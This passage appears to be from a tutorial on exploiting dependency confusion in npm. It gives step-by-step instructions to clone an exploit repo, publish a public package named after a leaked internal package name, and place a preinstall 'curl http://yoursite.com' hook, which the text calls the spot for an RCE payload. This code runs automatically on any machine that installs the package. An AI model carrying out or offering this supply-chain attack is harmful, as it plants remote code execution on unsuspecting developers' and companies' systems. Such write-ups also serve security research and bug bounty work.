https://0xsapra.github.io/website//Exploiting-Dependency-Confusion

git clone https://github.com/0xsapra/dependency-confusion-expoit
cd dependency-confusion-expoit
Edit package.json following fields
Change module name from "name": "your-module-name", to "name": "xss-finder-0xsapra",.
Change Version from "version": "1.0.0", to "version": "1.0.0",
Th leaked package.json shows xss-finder-0xsapra is at version 1.0.0 so we use that same version
Change preinstall script from "preinstall": "curl http://yoursite.co.m" to "preinstall": "curl http://yoursite.com"
preinstall is the bash command that gets executed. Put your RCE payload here After Editing, the package.json should look like:
After editing package.json, next step is to upload this package to npm. To do this you can follow the steps from https://zellwk.com/blog/publish-to-npm/ . Here’s the same steps:
Login/Signup into npm from https://www.npmjs.com/signup
Open terminal/bash and login into npm public registry from terminal using npm login command
Run npm publish . in terminal and it will publish xss-finder-0xsapra to npm
You can now find the package uploaded on https://npmjs.com
